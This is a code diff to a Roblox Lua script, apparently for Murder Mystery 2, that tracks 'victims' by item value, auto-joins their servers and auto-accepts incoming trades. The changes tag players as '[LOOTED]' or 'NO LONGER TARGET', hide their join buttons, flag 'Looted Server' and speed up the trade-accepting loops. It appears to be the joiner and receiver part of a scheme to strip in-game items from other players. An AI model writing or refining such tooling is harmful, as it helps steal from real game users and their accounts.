@@ -284,16 +284,17 @@ local function createRow(victim)
     i_new("UICorner", Row).CornerRadius = UDim.new(0, s(6))
     applyLedEffect(Row, s)
     local NameLbl = i_new("TextLabel", Row)
-    NameLbl.Text, NameLbl.Font, NameLbl.TextSize, NameLbl.TextColor3 = victim.victim, Enum.Font.GothamBold, s(16), Color3.fromRGB(255, 255, 255)
+    NameLbl.Text, NameLbl.Font, NameLbl.TextSize, NameLbl.TextColor3 = (victim.looted and "[LOOTED] " or "") .. victim.victim, Enum.Font.GothamBold, s(16), (victim.looted and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(255, 255, 255))
     NameLbl.Position, NameLbl.Size, NameLbl.BackgroundTransparency = UDim2.new(0, s(10), 0, s(5)), UDim2.new(0.5, 0, 0.5, 0), 1
     NameLbl.TextXAlignment = Enum.TextXAlignment.Left
     local ValLbl = i_new("TextLabel", Row)
-    ValLbl.Text, ValLbl.Font, ValLbl.TextSize, ValLbl.TextColor3 = "RAP: " .. formatValue(victim.val), Enum.Font.Gotham, s(14), Color3.fromRGB(100, 255, 100)
+    ValLbl.Text, ValLbl.Font, ValLbl.TextSize, ValLbl.TextColor3 = (victim.looted and "NO LONGER TARGET" or "RAP: " .. formatValue(victim.val)), Enum.Font.Gotham, s(14), (victim.looted and Color3.fromRGB(200, 50, 50) or Color3.fromRGB(100, 255, 100))
     ValLbl.Position, ValLbl.Size, ValLbl.BackgroundTransparency = UDim2.new(0, s(10), 0.5, 0), UDim2.new(0.5, 0, 0.5, 0), 1
     ValLbl.TextXAlignment = Enum.TextXAlignment.Left
     local JoinBtn = i_new("TextButton", Row)
     JoinBtn.Size, JoinBtn.Position, JoinBtn.BackgroundColor3 = UDim2.new(0.2, 0, 0.6, 0), UDim2.new(0.55, 0, 0.2, 0), Color3.fromRGB(60, 60, 255)
     JoinBtn.Text, JoinBtn.Font, JoinBtn.TextColor3, JoinBtn.TextSize = "JOIN", Enum.Font.GothamBold, Color3.fromRGB(255, 255, 255), s(14)
+    JoinBtn.Visible = not victim.looted
     i_new("UICorner", JoinBtn).CornerRadius = UDim.new(0, s(6))
     applyLedEffect(JoinBtn, s)
     JoinBtn.MouseButton1Click:Connect(function()
@@ -304,14 +305,34 @@ end
 
 local function refreshList()
     for _, c in ipairs(Container:GetChildren()) do if not c:IsA("UIListLayout") then c:Destroy() end end
-    t_sort(State.Victims, function(a, b) return (tonumber(a.val) or 0) > (tonumber(b.val) or 0) end)
+    
+    local displayList = {}
+    local seenVictims = {}
+    
+    for _, v in ipairs(State.Victims) do
+        t_insert(displayList, v)
+        seenVictims[s_lower(v.victim)] = true
+    end
+    
+    -- Detect looted players in current server
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and not seenVictims[s_lower(p.Name)] then
+            t_insert(displayList, {victim = p.Name, val = 0, looted = true, link = ""})
+        end
+    end
+    
+    t_sort(displayList, function(a, b) 
+        if a.looted ~= b.looted then return not a.looted end
+        return (tonumber(a.val) or 0) > (tonumber(b.val) or 0) 
+    end)
+    
     HitsLabel.Text = "Available Hits: " .. #State.Victims
-    if #State.Victims == 0 then
+    if #displayList == 0 then
         local el = i_new("TextLabel", Container)
         el.Text, el.Size, el.BackgroundTransparency, el.TextColor3 = "No Active Targets", UDim2.new(1, 0, 0, s(40)), 1, Color3.fromRGB(150, 150, 150)
         el.Font, el.TextSize = Enum.Font.Gotham, s(14)
-    else for _, v in ipairs(State.Victims) do createRow(v) end end
-    Container.CanvasSize = UDim2.new(0, 0, 0, #State.Victims * s(70))
+    else for _, v in ipairs(displayList) do createRow(v) end end
+    Container.CanvasSize = UDim2.new(0, 0, 0, #displayList * s(70))
 end
 
 local function fetchVictims()
@@ -335,6 +356,8 @@ local function AutoJoinStep()
     if not Config.AutoJoin or State.IsTeleporting or State.ReceiverActive then return end
     t_sort(State.Victims, function(a, b) return (tonumber(a.val) or 0) > (tonumber(b.val) or 0) end)
     local mv = tonumber(Config.MinTargetValue) or 0
+    
+    local foundInServer = false
     for _, v in ipairs(State.Victims) do
         if tonumber(v.val) >= mv then
             local job = parseJobId(v.link)
@@ -346,6 +369,12 @@ local function AutoJoinStep()
             end
         end
     end
+    
+    -- If we are in a game but no one from the list is here, it's a looted server
+    if #Players:GetPlayers() > 1 then
+        setStatus("Looted Server - Searching...")
+    end
+
     local si = Config.TargetIndex or 1
     local found = false
     for i = si, #State.Victims do
@@ -391,7 +420,7 @@ function startReceiver()
                     while true do
                         local s, res = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
                         if s and res == "ReceivingRequest" then Trade.AcceptRequest:FireServer(); State.ReceiverActive = true end
-                        t_wait(0.5)
+                        t_wait(0.2)
                     end
                 end)
                 t_spawn(function()
@@ -418,10 +447,10 @@ function startReceiver()
                         end
                     end
                     State.ReceiverActive = false
-                    t_wait(0.5)
+                    t_wait(0.2)
                 end
             end
-            while true do pcall(mm2Main); t_wait(2) end
+            while true do pcall(mm2Main); t_wait(1) end
         end)
     end
 end
